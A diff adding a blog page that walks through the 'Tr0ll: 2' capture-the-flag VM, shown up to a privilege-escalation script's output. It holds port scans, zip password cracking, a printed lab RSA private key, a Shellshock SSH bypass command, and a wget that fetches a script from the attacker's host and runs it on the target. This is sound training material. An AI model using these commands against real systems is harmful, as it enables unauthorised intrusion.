@@ -1,0 +1,2498 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<meta charset="UTF-8">
+<meta name="description" content="">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<!-- The above 4 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+
+<!-- Title -->
+<title>Gandosha - Autodidacticism.</title>
+
+<!-- Core Stylesheet -->
+<link rel="stylesheet" href="style.css">
+
+</head>
+
+<body>
+<!-- Preloader -->
+<div id="preloader">
+<div class="loader"></div>
+</div>
+
+<div class="vcard-main-wrapper">
+<div class="vcard-content-wrapper bg-img" style="background-image: url(img/bg-img/bgssss.jpg);">
+<!-- Header Area -->
+<header class="header_area">
+<!-- Logo -->
+<div class="logo d-flex justify-content-center align-items-center">
+<a href="index-horizontal-about.html"><img src="img/core-img/logo3.png" alt=""></a>
+<!-- Navbar Toggle -->
+<div class="nav-toggle">
+<i class="fa fa-bars"></i>
+</div>
+</div>
+
+<!-- Menu -->
+<ul class="vcard-nav">
+<li><a href="https://github.com/Gandosha" data-toggle="tooltip" data-placement="top" title="Github"><i class="fa fa-fw fa-github" aria-hidden="true"></i></a></li>
+<li><a href="index.html">About</a></li>
+<li class="active"><a href="walkthroughs.html">CTF Walkthroughs</a></li>
+<li><a href="cheatsheets.html">Cheat Sheets</a></li>
+</ul>
+</header>
+
+<!-- Vcard Page Content -->
+<div class="vcard-page-content-wrapper d-flex align-items-end">
+<div class="page-content">
+
+<!-- ##### VM Title and link ##### -->
+<div class="about-me-area section-padding-100 clearfix">
+<div class="container-fluid">
+<div class="row align-items-end">
+<div class="about-me-text">
+<hr>
+<p><h2>Tr0ll: 2</h2>
+<h8><b>Service discovery --> Web directories fuzzing  --> Brute forcing .zip password --> Bypass SSH restriction (shellshock bug) --> Privilege Escalation (buffer overflow)</b></h8></p>
+<h7>VM: https://www.vulnhub.com/entry/tr0ll-2,107/</h7></p>
+<hr>
+<br>
+<br>
+<br>
+<br>
+<p><h3>Service discovery:</h3></p>
+<hr>
+<p><font size="3.5" color="black">First, I fired up HaGashash in order to gain some information about which host to attack and what interesting services run there. (https://github.com/Gandosha/HaGashash).</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC ~]# go run go/src/github.com/Gandosha/HaGashash/main.go -interface=enp0s3 -project=Tr0ll_2 -subnet=true
+
+
+
+<-=|HaGashash by Gandosha|=->
+
+[+] nmap executable is in '/usr/bin/nmap'
+[+] ifconfig executable is in '/usr/bin/ifconfig'
+[!] Dependencies check is completed successfully.
+
+
+[!] Starting to scan your subnet.
+
+ 
+[+] Alive hosts in 192.168.43.0/24 are:
+
+192.168.43.1
+
+192.168.43.2
+
+192.168.43.4
+
+192.168.43.3
+
+
+[+] Directory created at: /HaGashash_Projects/Tr0ll_2/192.168.43.1.
+
+
+[!] Starting to scan 192.168.43.1 for TCP interesting stuff.
+
+
+
+[!] Starting to scan 192.168.43.1 for UDP interesting stuff.
+
+
+[+] Directory created at: /HaGashash_Projects/Tr0ll_2/192.168.43.2.
+
+
+[!] Starting to scan 192.168.43.2 for TCP interesting stuff.
+
+
+
+[!] Starting to scan 192.168.43.2 for UDP interesting stuff.
+
+
+[+] Directory created at: /HaGashash_Projects/Tr0ll_2/192.168.43.4.
+
+
+[!] Starting to scan 192.168.43.4 for TCP interesting stuff.
+
+
+
+[!] Starting to scan 192.168.43.4 for UDP interesting stuff.
+
+
+[+] Directory created at: /HaGashash_Projects/Tr0ll_2/192.168.43.3.
+
+
+[!] Starting to scan 192.168.43.3 for UDP interesting stuff.
+
+
+
+[!] Starting to scan 192.168.43.3 for TCP interesting stuff.
+
+
+
+[+] Nmap's TCP script scanning on 192.168.43.3 is completed successfully.
+
+
+
+[+] Nmap's TCP script scanning on 192.168.43.4 is completed successfully.
+
+
+
+[+] Nmap's TCP script scanning on 192.168.43.2 is completed successfully.
+
+
+
+[+] Nmap's UDP script scanning on 192.168.43.3 is completed successfully.
+
+
+
+[+] Nmap's TCP script scanning on 192.168.43.1 is completed successfully.
+
+
+
+[+] Nmap's UDP script scanning on 192.168.43.4 is completed successfully.
+
+
+
+[+] Nmap's UDP script scanning on 192.168.43.1 is completed successfully.
+
+
+
+[+] Nmap's UDP script scanning on 192.168.43.2 is completed successfully.
+
+
+
+[+] Summary file for 192.168.43.4 is ready.
+
+
+
+[+] Summary file for 192.168.43.3 is ready.
+
+
+
+[+] Summary file for 192.168.43.2 is ready.
+
+
+
+[+] Summary file for 192.168.43.1 is ready.
+
+# Nmap 7.70 scan initiated Mon Oct 29 17:15:34 2018 as: nmap -sS -p- -A -T4 -Pn -vv -oN /HaGashash_Projects/Tr0ll_2/192.168.43.4/nmap_TCP_scan_output 192.168.43.4
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.43.4
+Host is up, received arp-response (0.0033s latency).
+Scanned at 2018-10-29 17:15:37 IST for 39s
+Not shown: 65532 closed ports
+Reason: 65532 resets
+PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.0.8 or later
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)
+| ssh-dss AAAAB3NzaC1kc3MAAACBALSoHkrGLGdoGCUxvP4LXhGxwwE2qABymlFojSsxW9JHipIqzNXTjAzetIpf9d/QP5VjmYepnwd6qXQU+uUtWEGeQdXRWzCvjok9JQepGRgIqEDOXZC7xyFxmBDKCTk88YiDbJoh7qQF0CMMMooO29cPJDDJWOKVxd6waA+E9TY3AAAAFQD0aumbrVQcxUQhIX8z7z6eMV53+wAAAIA2EKw98THYwQat/cmZ1Tnm82OCiyaZUD/1meZMJUkIJspK2ka8jf7a5YTpo2bEh1D+ZD1Mhvta4PaR8NlOjLaih7TWV2NKtaWKKOCEWMSydkndkfzgvcXjP4zRLrIhNPWDeF2rLw7DXI4mT/jaYkyJZRbf8bBTGWau/HD+uPQO9AAAAIBAZaVrjIqrPntdwF8kERmLFdlQGH8a12hiB+3O6Z7sB9ppOuuMshiKJ3Yw5gwOuQNQQGiFmA/TrbprR90PoQGLpPQRGB1jAnrZV2PgAWEmarEoAm23Yiwwlr7tfRH3Wa0QR1FthsWxsmo5xuC6K7rmpZ0vLbNB4MjPP8igwIAkGA==
+|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTwBMwZV9lfeG6WRFDvN0Uf2IjaN5FCES+KTAO1oHLt9Es+kQ7CI8fLyiNNoC0FJuCWvnOgGCDYjbQWZ9AyapU6HXsXHnGoJyTBxEc7cBBt+d0EEhr/sK/rym+klu7tSE5T1DWtAEhdLfsEiRPsmTVoaQEAglu8fq1KKUrKZaaDlDStTd2Vw7vQ2stmHYv5SPFysT9gIPag9kpdVjWUKFoou1MFE7kBkVb9rcQtFV6Gxz2sD4AqepQK0OJqrCLW/87Je5VAdSZqE7eILdpQZTBEipo1hD9qyhl4KlKTvweRYjNGZVTxSe95E0ZI+dv8XsFCmtZ+X3IpNu+qQh/BkgX
+|   256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)
+|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDgmGXAkVDdDIbCWmGw3WD1EaiTXLzqQ9BmLVwnXjgpgDqPNMOjgrGczwWwjEJbSpSgmDhn7p5boD2wq5dV+cMM=
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.22 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 08:00:27:84:0A:09 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10
+TCP/IP fingerprint:
+OS:SCAN(V=7.70%E=4%D=10/29%OT=21%CT=1%CU=38900%PV=Y%DS=1%DC=D%G=Y%M=080027%
+OS:TM=5BD72440%P=x86_64-unknown-linux-gnu)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=
+OS:Z%II=I%TS=8)OPS(O1=M5B4ST11NW3%O2=M5B4ST11NW3%O3=M5B4NNT11NW3%O4=M5B4ST1
+OS:1NW3%O5=M5B4ST11NW3%O6=M5B4ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3
+OS:890%W6=3890)ECN(R=Y%DF=Y%T=40%W=3908%O=M5B4NNSNW3%CC=Y%Q=)T1(R=Y%DF=Y%T=
+OS:40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%
+OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=4
+OS:0%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%
+OS:Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
+OS:Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 198.840 days (since Fri Apr 13 22:06:32 2018)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=264 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   3.34 ms 192.168.43.4
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Oct 29 17:16:16 2018 -- 1 IP address (1 host up) scanned in 43.98 seconds
+</pre>
+<hr>
+<br>
+<br>
+<p><h3>Port 21 check:</h3></p>
+<hr>
+<p><font size="3.5" color="black">According to Nmap's output port 21 is open.</font></p>
+<p><font size="3.5" color="black">Attempt to access ftp:</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC 192.168.43.4]# ftp 192.168.43.4
+Connected to 192.168.43.4.
+220 Welcome to Tr0ll FTP... Only noobs stay for a while...
+Name (192.168.43.4:root): noobs
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed.
+ftp> ^C
+ftp> quit
+221 Goodbye.
+[GandoPC 192.168.43.4]# ftp 192.168.43.4
+Connected to 192.168.43.4.
+220 Welcome to Tr0ll FTP... Only noobs stay for a while...
+Name (192.168.43.4:root): noobs
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed.
+ftp> quit
+221 Goodbye.
+[GandoPC 192.168.43.4]# ftp 192.168.43.4
+Connected to 192.168.43.4.
+220 Welcome to Tr0ll FTP... Only noobs stay for a while...
+Name (192.168.43.4:root): Tr0ll
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed.
+ftp> quit
+221 Goodbye.
+[GandoPC 192.168.43.4]# ftp 192.168.43.4
+Connected to 192.168.43.4.
+220 Welcome to Tr0ll FTP... Only noobs stay for a while...
+Name (192.168.43.4:root): Tr0ll
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip
+226 Directory send OK.
+ftp> get lmao.zip
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
+226 Transfer complete.
+1474 bytes received in 0.0221 seconds (65.2 kbytes/s)
+ftp> quit
+221 Goodbye.
+</pre>
+<p><font size="3.5" color="black">A zip file is found, but it is protected with a password:</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC 192.168.43.4]# unzip lmao.zip 
+Archive:  lmao.zip
+[lmao.zip] noob password: 
+password incorrect--reenter: 
+password incorrect--reenter:
+</pre>
+<hr>
+<br>
+<br>
+<p><h3>Port 80 check:</h3></p>
+<hr>
+<p><font size="3.5" color="black">Attempt to access via http port 80:</font></p>
+<img src="img/troll_2/1.png" alt="Attempt to access via http port 80" style="border:1px solid black;">
+<br>
+<br>
+<p><font size="3.5" color="black">Fuzzing revealed a robots.txt file:</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC 192.168.43.4]# /root/go/src/github.com/OJ/gobuster/./gobuster -w /home/gandosha/Desktop/SecLists/Discovery/Web-Content/raft-large.txt -u http://192.168.43.4 
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://192.168.43.4/
+[+] Threads      : 10
+[+] Wordlist     : /home/gandosha/Desktop/SecLists/Discovery/Web-Content/raft-large.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2018/10/29 18:07:30 Starting gobuster
+=====================================================
+/index (Status: 200)
+/robots (Status: 200)
+/server-status (Status: 403)
+/index.html (Status: 200)
+/.htaccess (Status: 403)
+/robots.txt (Status: 200)
+/. (Status: 200)
+/.html (Status: 403)
+/.htpasswd (Status: 403)
+/.htm (Status: 403)
+/.htpasswds (Status: 403)
+/.htgroup (Status: 403)
+/.htaccess.bak (Status: 403)
+/.htuser (Status: 403)
+/.htc (Status: 403)
+/.ht (Status: 403)
+/.htacess (Status: 403)
+/.htaccess.old (Status: 403)
+/.html (Status: 403)
+/index (Status: 200)
+/.htm (Status: 403)
+/. (Status: 200)
+/.htaccess (Status: 403)
+/robots (Status: 200)
+/.htc (Status: 403)
+/.html_var_DE (Status: 403)
+/server-status (Status: 403)
+/.htpasswd (Status: 403)
+/.html. (Status: 403)
+/.html.html (Status: 403)
+/.htpasswds (Status: 403)
+/.htm. (Status: 403)
+/.htmll (Status: 403)
+/.html.old (Status: 403)
+/.ht (Status: 403)
+/.html.bak (Status: 403)
+/.htm.htm (Status: 403)
+/.html1 (Status: 403)
+/.htgroup (Status: 403)
+/.hta (Status: 403)
+/.html.printable (Status: 403)
+/.html.LCK (Status: 403)
+/.htm.LCK (Status: 403)
+/.html.php (Status: 403)
+/.htaccess.bak (Status: 403)
+/.htmls (Status: 403)
+/.htx (Status: 403)
+/.htm2 (Status: 403)
+/.htlm (Status: 403)
+/.htuser (Status: 403)
+/.html- (Status: 403)
+/.htacess (Status: 403)
+/.htm.old (Status: 403)
+/.html-1 (Status: 403)
+/.html_files (Status: 403)
+/.html.sav (Status: 403)
+/.htm.html (Status: 403)
+/.html_ (Status: 403)
+/.htm.d (Status: 403)
+/.htmlpar (Status: 403)
+/.htmlprint (Status: 403)
+/.html.orig (Status: 403)
+/.hts (Status: 403)
+/.htm.rc (Status: 403)
+/.htm7 (Status: 403)
+/.htm8 (Status: 403)
+/.htm.bak (Status: 403)
+/.htm_ (Status: 403)
+/.htm3 (Status: 403)
+/.htaccess.old (Status: 403)
+/.html-2 (Status: 403)
+/.html-- (Status: 403)
+/.html-old (Status: 403)
+/.html.htm (Status: 403)
+/.html-c (Status: 403)
+/.html-0 (Status: 403)
+/.htm5 (Status: 403)
+/.html7 (Status: 403)
+/.html.images (Status: 403)
+/.html-p (Status: 403)
+/.html.inc (Status: 403)
+/.html4 (Status: 403)
+/.html.start (Status: 403)
+/.html.pdf (Status: 403)
+/.html.txt (Status: 403)
+/.html5 (Status: 403)
+/.html.none (Status: 403)
+/.htmlq (Status: 403)
+/.htmla (Status: 403)
+/.htmlBAK (Status: 403)
+/.htmlDolmetschen (Status: 403)
+/.htmlfeed (Status: 403)
+/.html_old (Status: 403)
+/.htmlc (Status: 403)
+/.htn (Status: 403)
+/.htmlu (Status: 403)
+=====================================================
+2018/10/29 18:24:59 Finished
+=====================================================
+</pre>
+<img src="img/troll_2/2.png" alt="robots" style="border:1px solid black;">
+<br>
+<br>
+<p><font size="3.5" color="black">Downloading and looking for strings inside all .jpg files on the web server, exposed a clue for the next step:</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC 192.168.43.4]# wget http://192.168.43.4/dont_bother/cat_the_troll.jpg
+--2018-10-29 18:25:59--  http://192.168.43.4/dont_bother/cat_the_troll.jpg
+Connecting to 192.168.43.4:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 15873 (16K) [image/jpeg]
+Saving to: ‘cat_the_troll.jpg.3’
+
+cat_the_troll.jpg.3                             100%[=====================================================================================================>]  15.50K  --.-KB/s    in 0.02s   
+
+2018-10-29 18:26:00 (835 KB/s) - ‘cat_the_troll.jpg.3’ saved [15873/15873]
+
+[GandoPC 192.168.43.4]# strings cat_the_troll.jpg.3 
+JFIF
+#3-652-108?QE8<M=01F`GMTV[\[7DcjcXjQY[W
+)W:1:WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+"aq2
+\vRH
+sdwTi
+ aDP
+ aDP
+\z!$
+`aDc
+(Q@0S
+}}HQ\)
+B6F@
+T"8V
+!\#(
+u6.U
+6&	QY
+;.e{
+hH}Q
+=\x#uk
+?}1,;Gd
+~>znk
+BP~9D
+QFQHQT
+D	vOE
+{"yw
+.&9)
+Km3Q
+^Ah9]*
+%DGU
+WUh 
+:uWw
+ALzO#
+NO_`
+F wT
+s$3'
+H=ev
+0mwP
+J,hi
+nuMs[~
+XSy}]F
+Q{w}n=
+{k{]&
+Y]3P
+D&ai
+7+}(
+jr'h
+)0zZ
+L!&\~T
+`$3!
+8]j,
+K:/w.`'
+~^GR
+5zT)T
+Rq<8
+_mzN
+S0=&
+o&"8
+;H!\M.
+.l|(
+fC@FO
+8Yj5
+f	 &1
+Cdb>
+1<,n=
+Ksbv
+K	AM
+j?w1
+(669VNR
+u%u|Pl
+;Cw4d
+Ps<o
+rP{J
+H!u-
+Vcw9
+)Qup=-kG+
+$T3!k:~
+;*iZ
+wvwD
+">8Z
+mcc8=	
+IQTu
+@rh8T
++sx(
+kK+:
+=GEZ
+gugI
+}wR.
+-.u+
+Dm3Q
++}[R
+iZ{4
+Xn_B
+OYKH
+8Hq%
+ t+%s3
+o=	 
+<CgiZ
+jnavF
+]mb*=
+N9Z<+
+kF.j
+$v_I
+BI%z
+2\7c
+:t@n~@
+	.qtI
+$pGd
+8VVz
+nQ~4
+j--h
+8WSs
+@QEw^?
+nwyA
+aQ3O
+XBuJm08\&
+"PzJz
+>%cwJ
+t+7>
+'h(:
+]O7U
+ew\\
+0>!-
+1=xA0A
+A+eW
+H `q
+B1Ow
+~Q4awpX=
+0J<n
+v&8Y
+Z8$.
+yS-[
+2 -,
+e6mh
+{D c
+Il-FkKv
+i{j68
+XL{#
+*Mqhq
+O\ +
+Sk~B
+[jmdR
+Ol;I
+'%jq
+iZ7%
+Po.d
+I {-G>
+	^ah
+{)V,
+8]-#
+g<.}
+'o&Q
+4F8Q
+	-wC
+ F>J
+_mg=
+i{&0
+1ancNpG*
+=VZ[MH
+hZOtY
+'=!)
+Bwgq
+Ws_4\2{.M
+&yC*
+;,?	@
+g%t.
+).eG`
+:q+|
+tA{vF
+_R4+
+V'E[
+XKwyDOt
+f>U_
+6 ;+5
+q/2~WB
+Xi]5
+tT]+_
+kTm6
+0W;u
++cih
+Qhcv
+`*0G
+nD{-4/
+pzw\
+GkDu(
+FprFAF@
+2;.uG
++=\k
+UN"1
+khTvH
+Q}Jm
+ee->
+k!;Z
+ivc2
+ZMV0
+-wI<
+nCO%?C
+.vI
+QLON
+@Si;X'
+f02HP
+8Jh;
+gYCJ
+pV}A
+7U	4
+]=%em;
+lj\p
+*/ p?E$
+Look Deep within y0ur_self for the answer
+</pre>
+<p><font size="3.5" color="black">So I "Looked Deep within y0ur_self for the answer":</font></p>
+<img src="img/troll_2/3.png" alt="y0ur_self" style="border:1px solid black;">
+<br>
+<br>
+<p><font size="3.5" color="black">I downloaded answer.txt and I looked at its content:</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC 192.168.43.4]# wget http://192.168.43.4/y0ur_self/answer.txt
+--2018-10-29 18:31:29--  http://192.168.43.4/y0ur_self/answer.txt
+Connecting to 192.168.43.4:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1412653 (1.3M) [text/plain]
+Saving to: ‘answer.txt’
+
+answer.txt                                      100%[=====================================================================================================>]   1.35M   743KB/s    in 1.9s    
+
+2018-10-29 18:31:31 (743 KB/s) - ‘answer.txt’ saved [1412653/1412653]
+</pre>
+<img src="img/troll_2/4.png" alt="answer" style="border:1px solid black;">
+<br>
+<br>
+<p><font size="3.5" color="black">A long base64 encoded content is discovered.</font></p>
+<p><font size="3.5" color="black">I decoded the content and made it "uniq":</font></p>
+<img src="img/troll_2/5.png" alt="decode" style="border:1px solid black;">
+<br>
+<br>
+<p><font size="3.5" color="black">List of 73128 unique entries:</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC 192.168.43.4]# sort answer_decoded.txt | uniq > answer_uniq.txt
+[GandoPC 192.168.43.4]# less answer_uniq.txt 
+[GandoPC 192.168.43.4]# sort answer_uniq.txt | wc -l
+73128
+</pre>
+<hr>
+<br>
+<br>
+<p><h3>Brute forcing lmao.zip password:</h3></p>
+<hr>
+<pre style="background-color:black;color:white;">
+[GandoPC 192.168.43.4]# fcrackzip -u noob -D -p answer_uniq.txt lmao.zip 
+skipping 'noob': No such file or directory
+
+
+PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL
+[GandoPC 192.168.43.4]# unzip lmao.zip 
+Archive:  lmao.zip
+[lmao.zip] noob password: 
+  inflating: noob    
+</pre>
+<p><font size="3.5" color="black">A private key file is found.</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC 192.168.43.4]# file noob 
+noob: PEM RSA private key
+[GandoPC 192.168.43.4]# cat noob 
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
+yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
+/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
+q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
+z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
+e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
+u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
+gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
+UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
+La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
+xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
+aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
+K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
+n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
+TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
+WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
+ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
+0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
+vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
+ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
+th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
+G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
+q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
+vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
+zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
+-----END RSA PRIVATE KEY-----
+</pre>
+<p><font size="3.5" color="black">I knew that SSH port is open, So I tried to connect to the machine using this private key.</font></p>
+<hr>
+<br>
+<br>
+<p><h3>Bypass SSH restriction using Shellshock bug:</h3></p>
+<hr>
+<p><font size="3.5" color="black">Attempt to SSH with the private key that is found:</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC 192.168.43.4]# ssh noob@192.168.43.4 -i noob 
+The authenticity of host '192.168.43.4 (192.168.43.4)' can't be established.
+ECDSA key fingerprint is SHA256:I3xuSgcBlIsoldKTkOyVYwx8B4NLGl0fDDTi0H6ExYg.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.43.4' (ECDSA) to the list of known hosts.
+TRY HARDER LOL!
+Connection to 192.168.43.4 closed.
+</pre>
+<p><font size="3.5" color="black">Dafaq?!</font></p>
+<p><font size="3.5" color="black">Shellshock can be used here:</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC 192.168.43.4]# ssh noob@192.168.43.4 -i noob '() { :;}; /bin/bash'
+ls
+pwd
+/home/noob
+whoami
+noob
+python -c 'import pty;pty.spawn("/bin/bash")'
+noob@Tr0ll2:~$ cd
+cd
+noob@Tr0ll2:~$ ls -aul
+ls -aul
+total 20
+drwx------ 4 noob root 4096 Oct 30 07:41 .
+drwxr-xr-x 5 root root 4096 Oct 14  2014 ..
+-rw------- 1 noob noob   75 Oct 30 07:41 .bash_history
+drwx------ 2 noob noob 4096 Oct  5  2014 .cache
+drwx------ 2 noob noob 4096 Oct  5  2014 .ssh
+</pre>
+<hr>
+<br>
+<br>
+<p><h3>Privilege escalation:</h3></p>
+<hr>
+<p><font size="3.5" color="black">As I got noob's shell, I started to enumerate the target:</font></p>
+<pre style="background-color:black;color:white;">
+noob@Tr0ll2:~$ history
+history
+    1  ./bof 
+    2  ./bof @@@@@@@@@@@@
+    3  gdb bof
+    4  rm bof 
+    5  ls -al
+    6  rm .bash_history 
+    7  su root
+    8  cd
+    9  ls -aul
+   10  history
+noob@Tr0ll2:~/.ssh$ cd /tmp;ls -aul
+cd /tmp;ls -aul
+total 8
+drwxrwxrwt  2 root root 4096 Oct 30 07:44 .
+drwxr-xr-x 23 root root 4096 Oct 24  2014 ..
+noob@Tr0ll2:/tmp$ wget 192.168.43.3/Tools/linuxprivchecker/linuxprivchecker.py
+<168.43.3/Tools/linuxprivchecker/linuxprivchecker.py                         
+--2018-10-30 07:46:35--  http://192.168.43.3/Tools/linuxprivchecker/linuxprivchecker.py
+Connecting to 192.168.43.3:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 25304 (25K)
+Saving to: `linuxprivchecker.py'
+
+100%[======================================>] 25,304      --.-K/s   in 0s      
+
+2018-10-30 07:46:35 (483 MB/s) - `linuxprivchecker.py' saved [25304/25304]
+
+noob@Tr0ll2:/tmp$ chmod +x linuxprivchecker.py
+chmod +x linuxprivchecker.py
+noob@Tr0ll2:/tmp$ python ./linuxprivchecker.py
+python ./linuxprivchecker.py
+=================================================================================================
+LINUX PRIVILEGE ESCALATION CHECKER
+=================================================================================================
+
+[*] GETTING BASIC SYSTEM INFO...
+
+[+] Kernel
+    Linux version 3.2.0-29-generic-pae (buildd@roseapple) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) ) #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012
+
+[+] Hostname
+    Tr0ll2
+
+[+] Operating System
+    ####### ######    ###   #       #        #####
+    #    #     #  #   #  #       #       #     #
+    #    #     # #     # #       #             #
+    #    ######  #     # #       #        #####
+    #    #   #   #     # #       #       #
+    #    #    #   #   #  #       #       #
+    #    #     #   ###   ####### ####### #######
+
+[*] GETTING NETWORKING INFO...
+
+[+] Interfaces
+    eth0      Link encap:Ethernet  HWaddr 08:00:27:84:0a:09
+    inet addr:192.168.43.4  Bcast:192.168.43.255  Mask:255.255.255.0
+    inet6 addr: fe80::a00:27ff:fe84:a09/64 Scope:Link
+    UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+    RX packets:714 errors:1 dropped:0 overruns:0 frame:0
+    TX packets:179 errors:0 dropped:0 overruns:0 carrier:0
+    collisions:0 txqueuelen:1000
+    RX bytes:80158 (80.1 KB)  TX bytes:50375 (50.3 KB)
